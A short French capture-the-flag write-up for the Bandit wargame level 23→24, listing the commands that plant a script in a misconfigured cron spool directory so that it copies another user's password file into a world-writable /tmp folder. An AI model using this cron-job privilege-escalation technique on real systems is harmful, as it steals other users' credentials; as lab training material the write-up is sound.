# Bandit Level 23 → 24

## Objectif
Exploiter un cron job qui exécute des scripts 
déposés dans un dossier spécifique.

## Commandes utilisées
cat /etc/cron.d/cronjob_bandit24
cat /usr/bin/cronjob_bandit24.sh
mkdir /tmp/b24
chmod 777 /tmp/b24
cat > /var/spool/bandit24/foo/hack.sh << 'EOF'
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/b24/pass
EOF
chmod 777 /var/spool/bandit24/foo/hack.sh
# Attendre 1 minute
cat /tmp/b24/pass

## Ce que j'ai appris
- Un cron job peut exécuter des scripts déposés par d'autres utilisateurs
- C'est une vulnérabilité classique de mauvaise configuration
- chmod 777 donne les permissions à tout le monde
- Le script s'exécute avec les permissions de bandit24
- Concept clé : exploitation de cron jobs mal configurés
